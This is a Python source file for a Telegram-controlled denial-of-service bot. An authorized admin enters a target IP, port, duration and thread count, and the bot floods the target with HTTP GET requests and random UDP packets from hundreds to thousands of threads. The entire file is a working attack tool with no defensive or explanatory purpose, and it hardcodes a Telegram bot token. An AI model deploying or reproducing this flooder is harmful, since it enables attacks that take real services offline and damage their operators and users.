import requests, time, threading, random, socket
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_ID = 8210011971

attack_active = False
user_state = {}

def send_worker(ip, port):
    global attack_active
    url = f"http://{ip}:{port}/"
    while attack_active:
        try:
            requests.get(url, timeout=2)
        except:
            pass

def udp_worker(ip, port):
    global attack_active
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while attack_active:
        try:
            sock.sendto(random._urandom(1024), (ip, port))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def start_attack(ip, port, threads, duration):
    global attack_active
    attack_active = True
    for _ in range(threads//2):
        threading.Thread(target=send_worker, args=(ip, port), daemon=True).start()
        threading.Thread(target=udp_worker, args=(ip, port), daemon=True).start()
    time.sleep(duration)
    attack_active = False

def start(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    user_state[update.effective_user.id] = {"step": "ip"}
    update.message.reply_text("Send IP:")

def handle(update, context):
    uid = update.effective_user.id
    if uid != ADMIN_ID or uid not in user_state:
        return
    s, t = user_state[uid], update.message.text.strip()
    if s["step"] == "ip":
        s["ip"], s["step"] = t, "port"
        update.message.reply_text("Send Port:")
    elif s["step"] == "port":
        s["port"], s["step"] = int(t), "time"
        update.message.reply_text("Send Time (sec):")
    elif s["step"] == "time":
        s["time"], s["step"] = int(t), "threads"
        kb = [[InlineKeyboardButton(str(x), callback_data=str(x))] for x in [500,1000,2000,5000]]
        update.message.reply_text("Threads:", reply_markup=InlineKeyboardMarkup(kb))

def button(update, context):
    q = update.callback_query
    q.answer()
    uid = update.effective_user.id
    if uid != ADMIN_ID:
        return
    d = user_state.pop(uid, {})
    if not d:
        return
    threads = int(q.data)
    q.edit_message_text(f"🔥 Attack on {d['ip']}:{d['port']} | {threads} thr | {d['time']}s")
    threading.Thread(target=start_attack, args=(d['ip'], d['port'], threads, d['time'])).start()

def stop(update, context):
    global attack_active
    attack_active = False
    update.message.reply_text("🛑 Stopped")

def main():
    u = Updater(TOKEN, use_context=True)
    u.dispatcher.add_handler(CommandHandler("start", start))
    u.dispatcher.add_handler(CommandHandler("stop", stop))
    u.dispatcher.add_handler(CallbackQueryHandler(button))
    u.dispatcher.add_handler(MessageHandler(Filters.text, handle))
    print("Bot Running...")
    u.start_polling()
    u.idle()

if __name__ == "__main__":
    main()
